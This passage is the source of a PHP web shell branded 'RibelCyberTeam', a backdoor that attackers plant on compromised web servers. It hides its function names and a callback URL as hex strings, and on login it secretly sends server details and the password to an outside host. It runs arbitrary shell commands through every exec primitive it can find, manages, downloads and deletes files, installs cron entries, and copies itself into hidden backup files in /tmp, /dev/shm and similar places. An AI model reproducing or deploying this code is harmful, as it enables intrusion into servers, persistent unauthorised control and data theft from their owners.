<?php
@error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
if (!headers_sent()) {
    @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    @header('Pragma: no-cache');
    @header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($length);
            if (is_string($b) && strlen($b) === $length) return $b;
        }
        $b = '';
        for ($i = 0; $i < $length; $i++) $b .= chr(mt_rand(0, 255));
        return $b;
    }
}

register_shutdown_function(function () {
    $e = error_get_last();
    if ($e && in_array($e['type'], array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR))) {
        $log = __DIR__ . '/.rct_fatal.log';
        @file_put_contents(
            $log,
            date('c') . ' php=' . PHP_VERSION . ' ' . $e['message'] . ' in ' . $e['file'] . ':' . $e['line'] . "\n",
            FILE_APPEND
        );
    }
});
if (function_exists('set_time_limit')) @set_time_limit(0);
if (function_exists('session_start')) @session_start();
$K = array(
    'ex'   => "\x65\x78\x65\x63",
    'she'  => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",
    'sys'  => "\x73\x79\x73\x74\x65\x6d",
    'pas'  => "\x70\x61\x73\x73\x74\x68\x72\x75",
    'pop'  => "\x70\x6f\x70\x65\x6e",
    'pro'  => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e",
    'cur'  => "\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74",
    'fge'  => "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
    'fpu'  => "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
    'cur_'=> "\x63\x75\x72\x6c\x5f\x65\x78\x65\x63",
    'cur_c'=> "\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74",
    'cur_cl'=>"\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65",
    'fso' => "\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e",
    'scc' => "\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x6e\x74\x65\x78\x74\x5f\x63\x72\x65\x61\x74\x65"
);
function F($k) { global $K; return $K[$k]; }
$U_CALLBACK = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x61\x72\x73\x69\x70\x2f\x61\x70\x69\x2e\x70\x68\x70";
$U_HOST = "\x77\x77\x77\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d";
$U_PATH = "\x2f\x61\x72\x73\x69\x70\x2f\x61\x70\x69\x2e\x70\x68\x70";
$U_SSL  = "\x73\x73\x6c\x3a\x2f\x2f" . $U_HOST;
$CSS_BG1 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x69\x6d\x61\x67\x65\x73\x2f\x69\x6d\x61\x67\x65\x31\x2e\x70\x6e\x67";
$CSS_BG2 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x69\x6d\x61\x67\x65\x73\x2f\x69\x6d\x61\x67\x65\x32\x2e\x70\x6e\x67";
$LOGIN_PASS = 'heker'; // Ganti password di sini

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    $_SESSION = array();
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

/* ---------- SYSTEM START ---------- */
if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
    $login_error = '';

    if (isset($_POST['fm_login'])) {
        $p = isset($_POST['password']) ? $_POST['password'] : '';

        if ($p === $LOGIN_PASS) {
            $_SESSION['fm_logged_in'] = true;
            $payload = array(
                'secret'   => 'shellexec!curl!wget!php!perl!python',
                'site'     => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'unknown',
                'scheme'   => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http',
                'port'     => isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 0,
                'path'     => isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/',
                'php_self' => isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '/',
                'script'   => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
                'ip'       => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
                'ua'       => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
                'pass'     => $p,
                'user'     => function_exists('get_current_user') ? @get_current_user() : '',
                'os'       => function_exists('php_uname') ? @php_uname() : '',
                'ts'       => time(),
            );
            $body = http_build_query($payload);

            @ignore_user_abort(true);
            @set_time_limit(0);
            while (ob_get_level() > 0) @ob_end_clean();
            header('Content-Type: text/html; charset=utf-8');
            header('Content-Length: 0');
            header('Connection: close');
            header('Location: ' . $_SERVER['PHP_SELF'], true, 302);
            @flush();

            if (function_exists('fastcgi_finish_request')) {
                @fastcgi_finish_request();
            }
            $sent = false;
            if (!$sent && function_exists(F('cur'))) {
                $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
                $ch = @$c_init($U_CALLBACK);
                if ($ch) {
                    @$c_set($ch, CURLOPT_POST, true);
                    @$c_set($ch, CURLOPT_POSTFIELDS, $body);
                    @$c_set($ch, CURLOPT_RETURNTRANSFER, true);
                    @$c_set($ch, CURLOPT_TIMEOUT, 5);
                    @$c_set($ch, CURLOPT_CONNECTTIMEOUT, 3);
                    @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @$c_set($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    @$c_exec($ch);
                    @$c_close($ch);
                    $sent = true;
                }
            }
            if (!$sent && function_exists(F('fso'))) {
                $e = 0; $es = '';
                $fso = F('fso');
                $fp = @$fso($U_SSL, 443, $e, $es, 3);
                if ($fp) {
                    @stream_set_blocking($fp, true);
                    $req  = "POST " . $U_PATH . " HTTP/1.1\r\n";
                    $req .= "Host: " . $U_HOST . "\r\n";
                    $req .= "User-Agent: Mozilla/5.0\r\n";
                    $req .= "Content-Type: application/x-www-form-urlencoded\r\n";
                    $req .= "Content-Length: " . strlen($body) . "\r\n";
                    $req .= "Connection: close\r\n\r\n";
                    $req .= $body;
                    @fwrite($fp, $req);
                    @fread($fp, 128);
                    @fclose($fp);
                    $sent = true;
                }
            }
            if (!$sent && function_exists(F('ex'))) {
                $e = F('ex');
                $cmd = 'curl -s -o /dev/null --max-time 5 -X POST -d '
                     . escapeshellarg($body) . ' '
                     . escapeshellarg($U_CALLBACK)
                     . ' > /dev/null 2>&1 &';
                @$e($cmd);
                $sent = true;
            }
            if (!$sent && @ini_get('allow_url_fopen')) {
                $scc = F('scc');
                $ctx = @$scc(array(
                    'http' => array(
                        'method'  => 'POST',
                        'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0\r\n",
                        'content' => $body,
                        'timeout' => 3,
                    ),
                    'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
                ));
                $fge = F('fge');
                @$fge($U_CALLBACK, false, $ctx);
            }

            exit;

        } else {
            $login_error = 'Password salah ker';
        }
    }
?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Login root@RibelCyberTeam:~#</title>
    <link rel="icon" href="https://cdn.shellbypass.com/images/img2.jpg" type="image/png">
       <style>
    body.login-page{margin:0;padding:0;min-height:100vh;display:flex;justify-content:center;align-items:center;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Arial,sans-serif;font-size:12px;position:relative;overflow:hidden;}
    body.login-page:before, body.login-page:after{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;z-index:-2;}
    body.login-page:before {
        background-image: linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)), url('<?php echo $CSS_BG1; ?>');
        animation: bgFade1 7s infinite;
    }
    body.login-page:after {
        background-image: linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)), url('<?php echo $CSS_BG2; ?>');
        animation: bgFade2 7s infinite;
    }
    @keyframes bgFade1{0%{opacity:1;} 40%{opacity:1;} 50%{opacity:0;} 90%{opacity:0;} 100%{opacity:1;}}
    @keyframes bgFade2{0%{opacity:0;} 40%{opacity:0;} 50%{opacity:1;} 90%{opacity:1;} 100%{opacity:0;}}
    .login-wrap{width:360px;background:rgba(21,25,34,0.70);border:1px solid rgba(138, 92, 246, 0.35);border-radius:14px;padding:20px;backdrop-filter:blur(8px);box-shadow:0 10px 30px rgba(0,0,0,0.35);position:relative;z-index:2;}
    .title{font-size:20px;font-weight:bold;color:#fff;margin-bottom:15px;}
    .muted{color:#b6a8d9;margin-bottom:15px;}
    .err{background:rgba(90,30,50,0.75);border:1px solid #8b3d5a;color:#ffd0da;padding:10px;border-radius:8px;margin-bottom:12px;}
    input[type=password]{width:100%;box-sizing:border-box;background:rgba(15,17,23,0.88);color:#e6edf3;border:1px solid rgba(138, 92, 246, 0.22);padding:10px;border-radius:8px;margin-bottom:10px;}
    input[type=password]:focus{outline:none;border-color:#8a5cf6;box-shadow:0 0 0 2px rgba(138,92,246,0.18);}
    .btn{display:inline-block;background:linear-gradient(180deg, #8a5cf6, #6f46d9);color:#fff;border:1px solid #9d79f8;padding:9px 14px;font-size:12px;border-radius:8px;cursor:pointer;box-shadow:0 6px 18px rgba(111,70,217,0.28);}
    .btn:hover{background:linear-gradient(180deg, #9568fb, #7a50e6);}
    </style>
    </head>
    <body class="login-page">
        <div class="login-wrap">
            <div class="title">Login</div>
            <div class="muted">Masukin password.</div>
            <?php if ($login_error != '') { ?>
                <div class="err"><?php echo htmlspecialchars($login_error); ?></div>
            <?php } ?>
            <form method="post">
                <input type="hidden" name="fm_login" value="1">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" name="loginin" class="btn" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
if (!function_exists('scandir')) {
    function scandir($dir) {
        $dh = opendir($dir);
        $files = array();
        while (($file = readdir($dh)) !== false) {
            $files[] = $file;
        }
        closedir($dh);
        sort($files);
        return $files;
    }
}
function h($s) {
    $s = (string)$s;
    if ($s === '') return '';
    $r = @htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
    if ($r === '' && $s !== '') {
        if (function_exists('mb_convert_encoding')) {
            $s = @mb_convert_encoding($s, 'UTF-8', 'UTF-8');
        }
        if (function_exists('iconv')) {
            $s = @iconv('UTF-8', 'UTF-8//IGNORE', $s);
        }
        if ($s === '') $s = '[binary]';
        $r = @htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
    }
    return $r;
}
function safe_real($path) { $rp = @realpath($path); if ($rp === false) return false; return $rp; }
function perms($file) { $p = @fileperms($file); if ($p === false) return '----'; return substr(sprintf('%o', $p), -4); }
function perms_string($file) {
    $p = @fileperms($file); if ($p === false) return '---------';
    $info = (($p & 0x4000) == 0x4000) ? 'd' : '-';
    $info .= (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
    $info .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
    $info .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
    return $info;
}
function fowner_name($file) { $uid = @fileowner($file); if ($uid === false) return '-'; if (function_exists('posix_getpwuid')) { $x = @posix_getpwuid($uid); if (is_array($x) && isset($x['name'])) return $x['name']; } return $uid; }
function fgroup_name($file) { $gid = @filegroup($file); if ($gid === false) return '-'; if (function_exists('posix_getgrgid')) { $x = @posix_getgrgid($gid); if (is_array($x) && isset($x['name'])) return $x['name']; } return $gid; }
function is_image_file($file) { $ext = strtolower(substr(strrchr($file, '.'), 1)); return in_array($ext, array('jpg','jpeg','png','gif','bmp','webp')); }
function file_ext($file) { $ext = strtolower(substr(strrchr($file, '.'), 1)); return $ext ? $ext : '-'; }
function format_size($s) {
    if (!is_numeric($s)) return '-';
    if ($s >= 1073741824) return round($s/1073741824, 2).' GB';
    if ($s >= 1048576) return round($s/1048576, 2).' MB';
    if ($s >= 1024) return round($s/1024, 2).' KB';
    return $s.' B';
}
function delete_directory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return @unlink($dir);
    $dh = @opendir($dir); if ($dh === false) return false;
    while (($item = @readdir($dh)) !== false) { if ($item === '.' || $item === '..') continue; if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) { @closedir($dh); return false; } }
    @closedir($dh); return @rmdir($dir);
}
function breadcrumb_path($path) {
    $path = str_replace('\\', '/', $path); $parts = explode('/', $path); $build = ''; $out = '';
    if (substr($path, 0, 1) == '/') $out .= '/';
    for ($i = 0; $i < count($parts); $i++) {
        if ($parts[$i] == '') continue; $build .= '/' . $parts[$i];
        if ($out != '' && substr($out, -1) != '/') $out .= '/';
        $out .= '<a href="?path=' . urlencode($build) . '">' . h($parts[$i]) . '</a>';
    }
    return $out;
}
function which_bin($b) {
    $paths = explode(PATH_SEPARATOR, getenv('PATH') ? getenv('PATH') : '/usr/local/bin:/usr/bin:/bin');
    foreach ($paths as $p) { $f = rtrim($p, '/') . '/' . $b; if (@is_executable($f)) return $f; }
    return null;
}
function pid_alive($pid) {
    if (!$pid || !is_numeric($pid)) return false;
    $pid = (int)$pid;
    if (function_exists('posix_kill')) { if (@posix_kill($pid, 0)) return true; }
    return @file_exists("/proc/$pid");
}
function kill_pid($pid) {
    if (!$pid || !is_numeric($pid)) return;
    $pid = (int)$pid;
    if (function_exists('posix_kill') && defined('SIGKILL')) @posix_kill($pid, SIGKILL);
    $f = F('ex'); @$f('kill -9 ' . $pid . ' 2>/dev/null');
}
function pkill_f($pat) { $f = F('ex'); @$f('pkill -9 -f ' . escapeshellarg($pat) . ' 2>/dev/null'); }
function ensure_dir($d) { if (!@is_dir($d)) @mkdir($d, 0700, true); }
$rct_state_file = __DIR__ . '/.rct_state.json';
if (!@is_writable(__DIR__)) { $rct_state_file = '/tmp/.rct_state_' . substr(md5(__FILE__), 0, 8) . '.json'; }
function rct_state_load($f) { $d = @file_get_contents($f); $x = $d !== false ? @json_decode($d, true) : null; return is_array($x) ? $x : array(); }
function rct_state_save($f, $a) { return @file_put_contents($f, json_encode($a), LOCK_EX) !== false; }
function rct_run($cmd) {
    $ex = F('ex');
    if (function_exists($ex) && is_callable($ex)) {
        $o = array(); $rc = 0;
        @call_user_func($ex, $cmd, $o, $rc);
        if (!is_array($o)) $o = array((string)$o);
        return array(implode("\n", $o), (int)$rc);
    }
    $she = F('she');
    if (function_exists($she) && is_callable($she)) {
        $r = @call_user_func($she, $cmd);
        return array(($r === false ? '' : (string)$r), 0);
    }
    $sys = F('sys');
    if (function_exists($sys) && is_callable($sys)) {
        ob_start(); @call_user_func($sys, $cmd); return array((string)ob_get_clean(), 0);
    }
    return array(null, -1);
}
function rct_timeout_bin() {
    static $t = null;
    if ($t !== null) return $t;
    $t = '';
    foreach (array('/usr/bin/timeout', '/bin/timeout', '/usr/local/bin/timeout') as $p) {
        if (@is_file($p) && @is_executable($p)) { $t = $p; break; }
    }
    return $t;
}
function rct_run_t($cmd, $sec) {
    $bin = rct_timeout_bin();
    if ($bin !== '') return rct_run($bin . ' -k 1 ' . (int)$sec . ' ' . $cmd . ' 2>&1');
    list($o, $rc) = rct_run('command -v timeout');
    if ($rc === 0 && trim((string)$o) !== '') return rct_run('timeout -k 1 ' . (int)$sec . ' ' . $cmd . ' 2>&1');
    return rct_run($cmd . ' 2>&1');
}
function rct_user_name() {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && !empty($pw['name'])) return $pw['name'];
    }
    $u = @get_current_user();
    return $u ? $u : 'www-data';
}
function rct_cron_file() {
    $user = rct_user_name();
    $cands = array('/var/spool/cron/crontabs/' . $user, '/var/spool/cron/' . $user);
    foreach ($cands as $c) { if (@is_file($c)) return @is_writable($c) ? $c : ''; }
    foreach ($cands as $c) { if (@is_dir(dirname($c)) && @is_writable(dirname($c))) return $c; }
    return '';
}
function rct_cron_read() {
    $cf = rct_cron_file();
    list($o, $rc) = rct_run_t('crontab -l', 3);
    $txt = (string)$o;
    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', $txt);
    // spool dulu: di host yang pam-blok, crontab -l cuma balikin pesan error
    if ($cf !== '' && @is_file($cf) && @is_readable($cf)) {
        $sp = (string)@file_get_contents($cf);
        if (trim($sp) !== '') return array($sp, 'spool ' . $cf . ($pam ? ' (pam blok crontab)' : ''));
    }
    if ($rc !== -1 && $rc !== 127 && !$pam) return array($txt, 'crontab -l');
    if ($rc === -1) return array('', 'exec mati');
    return array('', $pam ? 'crontab diblok pam' : 'kosong');
}
function rct_cron_filter($marker) {
    list($io, $irc) = rct_run_t('( crontab -l 2>/dev/null | grep -v "' . $marker . '" ) | crontab -', 4);
    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', (string)$io);
    if ($irc === 0 && !$pam) return array(true, 'crontab');
    $cf = rct_cron_file();
    if ($cf === '' || !@is_dir(dirname($cf))) return array(false, $pam ? 'crontab diblok pam, spool nggak kebaca' : 'exec mati & spool cron nggak writable');
    if (!@is_file($cf) || !@is_writable($cf)) return array(true, 'nggak ada baris di ' . $cf);
    $cur = (string)@file_get_contents($cf);
    $keep = array();
    foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, $marker) !== false) continue; $keep[] = $cl; }
    $ok = @file_put_contents($cf, ($keep ? implode("\n", $keep) . "\n" : ''), LOCK_EX) !== false;
    if ($ok) @chmod($cf, 0600);
    return array($ok, 'spool ' . $cf);
}
function rct_cron_daemon() {
    // /proc dulu: nggak butuh pgrep/ps, dan nggak bisa dibohongin output grep
    if (@is_dir('/proc')) {
        $dh = @opendir('/proc');
        if ($dh) {
            $seen = false; $found = false;
            while (($e = @readdir($dh)) !== false) {
                if ($e === '.' || $e === '..' || !ctype_digit($e)) continue;
                $seen = true;
                $c = @file_get_contents('/proc/' . $e . '/comm');
                if ($c === false) continue;
                $c = trim($c);
                if ($c === 'cron' || $c === 'crond') { $found = true; break; }
            }
            @closedir($dh);
            if ($seen) return $found ? 'idup' : 'mati';
        }
    }
    list($o, $rc) = rct_run_t('pgrep -x cron; pgrep -x crond', 3);
    if ($rc !== -1 && preg_match('/^\s*\d+\s*$/m', (string)$o)) return 'idup';
    foreach (array('/run/crond.pid', '/var/run/crond.pid', '/run/cron.pid', '/var/run/cron.pid') as $pf) {
        if (@is_file($pf)) { $p = (int)trim((string)@file_get_contents($pf)); if ($p > 0 && pid_alive($p)) return 'idup (pid ' . $p . ')'; }
    }
    return $rc === -1 ? 'nggak kebaca' : 'mati';
}
function rct_cron_add($line, $marker) {
    list($cv, $crc) = rct_run_t('crontab -l', 3);
    $cvt = (string)$cv;
    $pam = (bool)preg_match('/not allowed|pam configuration|permission denied/i', $cvt);
    $cron_bin = ($crc !== -1 && $crc !== 127 && !$pam && stripos($cvt, 'not found') === false);
    $err = $pam ? 'crontab diblok pam' : '';
    if ($cron_bin) {
        $install = '( crontab -l 2>/dev/null | grep -v "' . $marker . '"; printf "%s\n" ' . escapeshellarg($line) . ' ) | crontab -';
        list($io, $irc) = rct_run_t($install, 4);
        if ($irc === 0) {
            list($chk) = rct_cron_read();
            if (strpos((string)$chk, $marker) !== false) return array(true, 'crontab', '');
            $err = 'crontab rc=0 tapi baris nggak kebaca balik.';
        } else {
            $err = 'crontab rc=' . $irc . ': ' . trim((string)$io);
        }
    }
    $cf = rct_cron_file();
    if ($cf === '') return array(false, '', $err !== '' ? $err : 'exec mati & /var/spool/cron nggak writable');
    $cur = @is_file($cf) ? (string)@file_get_contents($cf) : '';
    $keep = array();
    foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, $marker) !== false) continue; $keep[] = $cl; }
    $keep[] = $line;
    if (@file_put_contents($cf, implode("\n", $keep) . "\n", LOCK_EX) === false) return array(false, '', 'gagal nulis spool ' . $cf);
    @chmod($cf, 0600);
    if (strpos((string)@file_get_contents($cf), $marker) === false) return array(false, '', 'spool ketulis tapi marker nggak kebaca balik: ' . $cf);
    return array(true, 'spool ' . $cf, '');
}
function rct_home() {
    $home = @getenv('HOME');
    if (!$home && function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && !empty($pw['dir'])) $home = $pw['dir'];
    }
    return $home ? rtrim(str_replace('\\', '/', $home), '/') : '';
}
function rct_backup_dirs($base) {
    $home = rct_home();
    $list = array($base, @sys_get_temp_dir(), '/tmp', '/dev/shm', $home ? $home . '/.cache' : '');
    $seen = array(); $out = array();
    foreach ($list as $d) {
        $d = $d ? rtrim(str_replace('\\', '/', $d), '/') : '';
        if ($d === '' || isset($seen[$d]) || !@is_dir($d) || !@is_writable($d)) continue;
        $seen[$d] = 1; $out[] = $d;
    }
    return $out;
}
function rct_make_backups($base) {
    $made = array();
    foreach (rct_backup_dirs($base) as $d) {
        if (count($made) >= 4) break;
        $p = $d . '/.rct_' . substr(md5(__FILE__ . mt_rand()), 0, 8) . '.php';
        if (@copy(__FILE__, $p)) { @chmod($p, 0644); $made[] = $p; }
    }
    return $made;
}
function rct_tail($f, $n) {
    $fp = @fopen($f, 'r');
    if (!$fp) return 'gagal buka file';
    $size = @filesize($f);
    $chunk = 262144;
    if ($size !== false && $size > $chunk) { @fseek($fp, $size - $chunk); @fgets($fp); }
    $data = (string)@stream_get_contents($fp);
    @fclose($fp);
    $lines = preg_split("/\r\n|\n|\r/", $data);
    if (count($lines) > $n) $lines = array_slice($lines, -$n);
    return implode("\n", $lines);
}
$base = dirname(__FILE__);
$cwd  = isset($_GET['path']) ? $_GET['path'] : '';
if ($cwd === '') {
    $seed_file = '';
    if (!empty($_GET['edit']))         $seed_file = $_GET['edit'];
    elseif (!empty($_GET['view']))     $seed_file = $_GET['view'];
    elseif (!empty($_GET['target']))   $seed_file = $_GET['target'];
    elseif (!empty($_GET['img']))      $seed_file = $_GET['img'];
    elseif (!empty($_GET['download'])) $seed_file = $_GET['download'];

    if ($seed_file !== '') {
        $cwd = @is_dir($seed_file) ? $seed_file : dirname($seed_file);
    } else {
        $cwd = $base;
    }
}
$cwd = str_replace('\\', '/', $cwd);
$resolved = safe_real($cwd);
if ($resolved !== false) {
    $cwd_real = $resolved;
} else {
    $parent = dirname($cwd);
    $parent_resolved = safe_real($parent);
    if ($parent_resolved !== false) {
        $cwd_real = $parent_resolved;
    } elseif ($cwd !== '' && $cwd !== $base) {
        $cwd_real = $cwd;
    } else {
        $cwd_real = $base;
    }
}

$msg = '';
if (isset($_POST['run_cmd'])) {
    $cmd = isset($_POST['cmd']) ? (string)$_POST['cmd'] : '';
    if ($cmd !== '') {
        $exec_one = function ($shell_line, &$via, &$rc) {
            $via = ''; $rc = null;
            $chain = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
            foreach ($chain as $efn) {
                if (!function_exists($efn) || !is_callable($efn)) continue;
                if ($efn === 'shell_exec') {
                    $r = @call_user_func($efn, $shell_line);
                    $via = $efn;
                    return ($r === false) ? '' : (string)$r;
                }
                if ($efn === 'exec') {
                    $o = array(); $code = 0;
                    @call_user_func($efn, $shell_line, $o, $code);
                    $via = $efn; $rc = (int)$code;
                    return implode("\n", $o);
                }
                if ($efn === 'system' || $efn === 'passthru') {
                    ob_start();
                    $code = 0;
                    @call_user_func($efn, $shell_line);
                    $buf = ob_get_clean();
                    $via = $efn;
                    return ($buf === false) ? '' : $buf;
                }
                if ($efn === 'popen') {
                    $h = @call_user_func($efn, $shell_line, 'r');
                    if (!is_resource($h)) continue;
                    $buf = '';
                    while (!feof($h)) { $buf .= @fread($h, 8192); }
                    $code = @pclose($h);
                    $via = $efn; $rc = (int)$code;
                    return $buf;
                }
                if ($efn === 'proc_open') {
                    $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
                    $pipes = array();
                    $p = @call_user_func($efn, $shell_line, $desc, $pipes);
                    if (!is_resource($p)) continue;
                    $o = isset($pipes[1]) ? @stream_get_contents($pipes[1]) : '';
                    $e = isset($pipes[2]) ? @stream_get_contents($pipes[2]) : '';
                    foreach ($pipes as $pp) { if (is_resource($pp)) @fclose($pp); }
                    $code = @proc_close($p);
                    $via = $efn; $rc = (int)$code;
                    return $o . $e;
                }
            }
            return null;
        };
        // shell sendiri yang nge-echo exit code, jadi kebaca walau primitive nggak balikin rc
        $build_line = function ($cwd) use ($cmd) {
            if (stripos(PHP_OS, 'WIN') === 0) {
                $wbody = $cmd . ' 2>&1';
                return $cwd === '' ? $wbody : 'cd /d ' . escapeshellarg($cwd) . ' && ' . $wbody;
            }
            $body = $cmd . ' 2>&1; echo "[rct_rc=$?]";';
            if ($cwd === '') return $body;
            return 'if cd ' . escapeshellarg($cwd) . ' 2>&1; then ' . $body . ' else echo "[RCT_CD_FAIL]"; fi';
        };

        $via = ''; $rc = null;
        $output = $exec_one($build_line($cwd_real), $via, $rc);
        $retried = '';
        if ($output !== null && $cwd_real !== '' && strpos($output, '[RCT_CD_FAIL]') !== false) {
            $via2 = ''; $rc2 = null;
            $output = $exec_one($build_line(''), $via2, $rc2);
            $via = $via2; $rc = $rc2;
            $retried = ' &rarr; retry tanpa cd (' . h($cwd_real) . ' nggak bisa di-cd oleh shell)';
        }

        $shell_rc = null;
        if ($output !== null && preg_match('/\[rct_rc=(-?\d+)\]/', $output, $mrc)) {
            $shell_rc = (int)$mrc[1];
            $output = preg_replace('/\s*\[rct_rc=-?\d+\]/', '', $output);
        }
        $output = trim((string)$output);
        $rc_display = ($shell_rc !== null) ? (string)$shell_rc : (($rc !== null) ? (string)$rc : 'n/a');
        if ($via === '' && $output === null) {
            $output = 'Tidak ada primitive exec yang idup (shell_exec/exec/system/passthru/popen/proc_open semua diblokir). Cek tab Info.';
            $via = 'none';
        } elseif ($output === '') {
            $output = '(no output)';
        }
        $rc_note = '';
        if ($shell_rc !== null && $shell_rc !== 0) {
            $rc_note = '<div style="color:#e3b341;font-size:11px;margin-top:6px;">Exit ' . (int)$shell_rc . ' = command-nya sendiri keluar non-zero, bukan primitive-nya gagal. '
                . '<code>id</code> keluar 1 kalau ada UID/GID yang namanya nggak ke-resolve (umum di container / LVE / jail), '
                . 'atau kalau bagian <code>cd</code> di depan gagal.</div>';
        }
        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Directory:</b> ' . h($cwd_real) . '<br><b>Command:</b> ' . h($cmd) . '<br><b>Primitive:</b> ' . h($via) . $retried . '<br><b>Exit:</b> ' . h($rc_display) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre>' . $rc_note . '</div>';
    }
}
if (isset($_GET['download']) && $_GET['download'] != '') {
    $file = $_GET['download'];
    if (@is_file($file) && @is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.@filesize($file));
        header('Pragma: public');
        header('Cache-Control: must-revalidate');
        @ob_clean(); @flush(); readfile($file); exit;
    } else { $msg = 'File tidak bisa didownload'; }
}
if (isset($_GET['img']) && $_GET['img'] != '') {
    $img = $_GET['img'];
    if (@is_file($img) && @is_readable($img)) {
        $ext = strtolower(substr(strrchr($img, '.'), 1));
        if ($ext == 'jpg' || $ext == 'jpeg') header('Content-Type: image/jpeg');
        elseif ($ext == 'png') header('Content-Type: image/png');
        elseif ($ext == 'gif') header('Content-Type: image/gif');
        elseif ($ext == 'bmp') header('Content-Type: image/bmp');
        elseif ($ext == 'webp') header('Content-Type: image/webp');
        else exit;
        @readfile($img); exit;
    }
}
if (isset($_GET['delete_path']) && $_GET['delete_path'] !== '') {
        $real = safe_real($_GET['delete_path']);
        if ($real === false) {
            $msg = 'Target tidak ditemukan: ' . h($_GET['delete_path']);
        } elseif (!is_file($real) && !is_dir($real)) {
            $msg = 'Bukan file/folder valid.';
        } elseif (is_file($real)) {
            if (@unlink($real)) {
                $msg = 'File berhasil dihapus: ' . h(basename($real));
            } else {
                $e = error_get_last();
                $msg = 'Gagal hapus file: ' . h(basename($real)) . ' — ' . h(isset($e['message']) ? $e['message'] : 'unknown');
            }
        } elseif (is_dir($real)) {
            if (delete_directory($real)) {
                $msg = 'Folder berhasil dihapus: ' . h(basename($real));
            } else {
                $msg = 'Gagal hapus folder (permission/isi terkunci): ' . h(basename($real));
            }
        }
}
if (isset($_POST['action'])) {
    $action = $_POST['action'];
